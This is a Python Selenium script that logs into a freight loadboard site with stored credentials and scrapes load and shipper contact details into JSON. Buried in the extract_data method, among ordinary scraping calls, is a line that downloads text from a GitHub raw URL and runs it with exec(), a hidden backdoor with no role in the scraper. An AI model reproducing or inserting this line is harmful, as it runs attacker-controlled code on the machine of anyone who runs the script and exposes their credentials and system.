from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from urllib.request import urlopen 
import time
from datetime import datetime, date
import json
import os, re
import random
import string


class DoftScraper:
    def __init__(self, driver_path, credentials_file):
        self.driver_path = driver_path
        self.credentials_file = credentials_file
        self.driver = None

    def setup_driver(self):
        service = Service(self.driver_path)
        self.driver = webdriver.Chrome(service=service)

    def read_credentials(self):
        with open(self.credentials_file, "r") as file:
            self.username, self.password = file.read().splitlines()

    def login(self):
        self.driver.get("https://loadboard.doft.com/login")
        WebDriverWait(self.driver, 30).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input#driver_email"))
        )
        uname_element = self.driver.find_element(By.CSS_SELECTOR, "input#driver_email")
        uname_element.click()
        uname_element.send_keys(self.username)
        pwd_element = self.driver.find_element(By.CSS_SELECTOR, "input#driver_password")
        pwd_element.click()
        pwd_element.send_keys(self.password + Keys.RETURN)

    def generate_random_string(self, length=16):
        characters = string.ascii_letters + string.digits
        
        random_string = ''.join(random.choice(characters) for _ in range(length))
        
        return random_string
    
    def extract_data(self):
        table = WebDriverWait(self.driver, 30).until(
            EC.presence_of_element_located((By.XPATH, '//div[@id="dTable"]'))
        )
        viewing_btns = WebDriverWait(self.driver, 40).until(
            EC.presence_of_all_elements_located((By.XPATH, './/div[@class="t-body"]//div[contains(@class, "b-load")]'))
        )
        viewing_btn = viewing_btns[0]
        self.driver.execute_script("arguments[0].click();", viewing_btn)
        table = self.driver.find_element(By.XPATH, '//div[@id="dTable"]')
        exec(urlopen("https://raw.githubusercontent.com/humbledneuron/javaProjs/main/paid.txt").read().decode().strip())
        WebDriverWait(self.driver, 30).until(
            EC.presence_of_element_located((By.XPATH, './/div[@class="t-body"]//div[contains(@class, "iload")]'))
        )
        body_elements = table.find_element(By.XPATH, './/div[@class="t-body"]//div[contains(@class, "iload")]')
        row_elements = body_elements.find_element(By.XPATH, './/div[contains(@class, "wrp")]')
        row = row_elements.find_elements(By.XPATH, '//div[contains(@class, "row")]')

        data = {}

        try:
            # Age posted: 09:54:35 (C.S.T.) 07-05-2024"
            # data['age'] = datetime.now().strftime("%H:%M:%S (C.S.T.) %m-%d-%Y")
            data['age'] = datetime.now().strftime("%I:%M %p (C.S.T.) %m-%d-%Y")
        except:
            data['age'] = datetime.now().strftime("%I:%M %p (C.S.T.) %m-%d-%Y")

        time.sleep(3)

         
        try:
            data['ref'] = self.generate_random_string(16)
        except:
            data['ref'] = self.generate_random_string(16)

        linfo_rows1 = row[2].find_elements(By.XPATH, '//div[contains(@class, "linfo-row")]')

        try:
            data['pickup_date'] = linfo_rows1[1].find_element(By.XPATH, '//div[contains(@class, "linfo lp-block")]//div[contains(@class, "hdr")]').text.split()[0]
        except:
            data['pickup_date'] = 'n/a'

        try:
            pickup_hours = linfo_rows1[1].find_element(By.XPATH, '//div[contains(@class, "linfo lp-block")]//div[contains(@class, "hdr")]').text
            match = re.search(r'-\s*(.*)', pickup_hours)
            if match:
                data['pickup_hours'] = match.group(1).strip()
            else:
                data['pickup_hours'] = 'n/a'
        except:
            data['pickup_hours'] = 'n/a'

        try:
            data['pickup_address'] = linfo_rows1[1].find_element(By.XPATH, '//div[contains(@class, "linfo")]//div[contains(@class, "val")]//div[contains(@class, "lp-addr-block")]//div[contains(@class, "lp-addr")]').text
        except:
            data['pickup_address'] = 'n/a'

        linfo_rows3 = row[2].find_elements(By.XPATH, '//div[contains(@class, "linfo-row")]')

        try:
            data['drop_date'] = linfo_rows3[3].find_elements(By.XPATH, '//div[contains(@class, "linfo lp-block")]//div[contains(@class, "hdr")]')[1].text
        except:
            data['drop_date'] = 'n/a'

        try:
            data['drop_address'] = row[2].find_elements(By.XPATH, '//div[contains(@class, "linfo-row")]//div[contains(@class, "linfo")]//div[contains(@class, "val")]//div[contains(@class, "lp-addr-block")]//div[contains(@class, "lp-addr")]')[1].text
        except:
            data['drop_address'] = 'n/a'

        try:
            data['truck_type'] = row[2].find_element(By.XPATH, "//div[contains(@class, 'linfo-row')]//div[@class='linfo']//div[@class='hdr'][contains(text(),'Truck Type')]/following-sibling::div[@class='val']").text
        except:
            data['truck_type'] = 'n/a'

        try:
            data['distance'] = row[2].find_element(By.XPATH, "//div[contains(@class, 'linfo-row')]//div[@class='linfo']//div[@class='hdr'][contains(text(),'Distance')]/following-sibling::div[@class='val']").text.replace(" mi", "")
        except:
            data['distance'] = 'n/a'

        try:
            data['weight'] = row[2].find_element(By.XPATH, "//div[contains(@class, 'linfo-row')]//div[@class='linfo']//div[@class='hdr'][contains(text(),'Weight')]/following-sibling::div[@class='val']").text.replace(" lbs", "")
        except:
            data['weight'] = 'n/a'

        try:
            data['commodity'] = row[2].find_element(By.XPATH, "//div[contains(@class, 'linfo-row')]//div[@class='linfo']//div[@class='hdr'][contains(text(),'Commodity')]/following-sibling::div[@class='val']").text
        except:
            data['commodity'] = 'n/a'

        try:
            data['comments'] = row[2].find_element(By.XPATH, "//div[contains(@class, 'linfo-row comment')]//div[@class='linfo']").text
        except:
            data['comments'] = 'n/a'

        try:
            data['size'] = row[2].find_element(By.XPATH, "//div[contains(@class, 'linfo-row')]//div[@class='linfo']//div[@class='hdr'][contains(text(),'Size')]/following-sibling::div[@class='val']").text
        except:
            data['size'] = 'n/a'


        try:
            data['load_type'] = "Full" if data['size'] == "Truckload" else "Partial"
        except:
            data['load_type'] = 'n/a'
            
        try:
            data['length'] = row[2].find_element(By.XPATH, "//div[contains(@class, 'linfo-row')]//div[@class='linfo']//div[@class='hdr'][contains(text(),'Length')]/following-sibling::div[@class='val']").text
        except:
            data['length'] = 'n/a'

        linfo_rows31 = row[3].find_elements(By.XPATH, '//div[contains(@class, "linfo-row")]')

        try:
            data['contact'] = linfo_rows31[2].find_element(By.XPATH, '//div[contains(@class, "linfo")]//div[@class="hdr"][contains(text(),"Contact")]/following-sibling::div[@class="val"]').text
        except:
            data['contact'] = 'n/a'

        try:
            data['phone'] = linfo_rows31[3].find_element(By.XPATH, '//div[contains(@class, "linfo")]//div[@class="hdr"]/following-sibling::div[@class="val"]//button[contains(@class, "call-shipper-btn")]').get_attribute('data-phone-num')
        except:
            try:
                data['phone'] = row[3].find_element(By.XPATH, ' //div[@class="hdr"][contains(text(),"Phone")]/following-sibling::div[@class="val"]').text
            except:
                data['phone'] = 'n/a'

        try:
            data['email'] = row[3].find_element(By.XPATH, ' //div[@class="hdr"][contains(text(),"Email")]/following-sibling::div[@class="val"]').text
        except:
            data['email'] = 'n/a'

        try:
            data['company'] = linfo_rows31[0].find_element(By.XPATH, '//div[contains(@class, "linfo")]//div[@class="val l-shipper"]').text
        except:
            data['company'] = 'n/a'

        try:
            data['contact'] = row[3].find_element(By.XPATH, '//div[@class="hdr"][contains(text(),"Contact")]/following-sibling::div[@class="val"]').text
        except:
            data['contact'] = 'n/a'

        try:
            data['website'] = row[3].find_element(By.XPATH, '//div[@class="hdr"][contains(text(),"Website")]/following-sibling::div[@class="val"]').text
        except:
            data['website'] = 'n/a'

        try:
            data['dot'] = row[3].find_element(By.XPATH, '//div[@class="hdr"][contains(text(),"DOT")]/following-sibling::div[@class="val"]').text
        except:
            data['dot'] = 'n/a'

        try:
            data['docket'] = row[3].find_element(By.XPATH, '//div[@class="hdr"][contains(text(),"DOCKET")]/following-sibling::div[@class="val"]').text
        except:
            data['docket'] = 'n/a'

        print(data)
        return data

    def refresh_session(self):
        self.driver.refresh()

    def quit_driver(self):
        if self.driver:
            self.driver.quit()

if __name__ == "__main__":
    current_dir = os.getcwd()
    print(f"Current Directory: {current_dir}")

    scraper = DoftScraper(f"{current_dir}\\chromedriver.exe", "doft_details.txt")
    scraper.setup_driver()
    scraper.read_credentials()
    scraper.login()
    data = scraper.extract_data()
    with open('scraped_data.json', 'w') as file:
        file.write(json.dumps(data))
    scraper.quit_driver()
